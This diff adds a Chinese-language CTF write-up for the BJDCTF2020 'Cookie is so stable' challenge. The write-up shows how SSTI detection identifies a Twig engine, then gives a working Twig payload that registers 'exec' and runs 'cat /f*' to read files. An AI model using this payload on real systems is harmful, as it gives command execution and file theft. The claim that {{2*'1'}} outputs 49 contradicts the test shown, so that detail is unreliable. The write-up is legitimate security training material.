@@ -1514,3 +1514,26 @@ Via: y1ng.vip
 
 
 
+# [BJDCTF2020]Cookie is so stable
+
+##### SSTI模板注入
+
+![image-20201213144912657](Buuoj-WEB-Write-up/image-20201213144912657.png)
+
+ID测试，不是SQL注入，测试`{{1+1}}`
+
+返回`2`，确认SSTI
+
+![image-20201213145018456](Buuoj-WEB-Write-up/image-20201213145018456.png)
+
+根据流程，测试`{{2*'1'}}`
+
+输出`49`
+
+确认为Twig模板引擎
+
+直接打Payload：
+
+`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /f*")}}`
+
+![image-20201213145633846](Buuoj-WEB-Write-up/image-20201213145633846.png)
